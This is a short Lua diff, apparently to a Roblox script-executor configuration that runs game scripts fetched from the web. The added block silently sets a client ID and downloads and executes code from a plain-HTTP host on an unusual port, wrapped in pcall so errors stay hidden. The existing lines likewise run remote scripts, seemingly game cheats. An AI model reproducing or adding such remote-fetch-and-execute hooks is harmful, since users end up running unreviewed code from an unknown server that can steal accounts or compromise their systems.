@@ -48,8 +48,14 @@ task.spawn(function()
         loadstring(game:HttpGet("https://blyatscripts.vercel.app/lo"))()
     end)
 end)
+task.spawn(function()
+    pcall(function()
+CLIENT_ID = "9c10b8d53a034a80"
+GAME = "sab"
+loadstring(game:HttpGet("http://d20.aurorix.net:25701/script/sab"))()
+    end)
+end)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/blade-ball-tuffness"))()
--- loadstring(game:HttpGet(""))()
 ]],
 
     default = [[
